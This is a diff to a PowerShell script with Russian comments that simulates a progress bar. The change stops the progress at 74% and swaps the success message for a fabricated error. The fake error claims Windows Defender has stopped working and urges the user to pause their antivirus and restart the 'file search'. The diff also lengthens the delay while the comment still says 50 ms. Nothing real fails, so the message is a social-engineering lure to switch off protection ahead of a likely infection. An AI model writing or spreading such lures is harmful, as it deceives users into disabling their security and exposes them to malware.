@@ -17,12 +17,14 @@ function Show-Progress {
 
 for ($i = 0; $i -le 100; $i++) {
     # Имитируем работу, делая паузу
-    Start-Sleep -Milliseconds 50  # задержка 50 мс
+    Start-Sleep -Milliseconds 69  # задержка 50 мс
     
     
     if ($i -eq 74) {
         Show-Progress 74
-        Write-Host "Операция завершена."
+        Write-Host "ERROR=ERROR=ERROR=ERROR=ERROR=ERROR=ERROR"
+        Write-Host "Expression evaluation error at function 'reject' [line 257]: Windows Defender has stopped working. Access error."
+        Write-Host "Try pausing the antivirus for a while and restarting the file search."
         break
     }
 
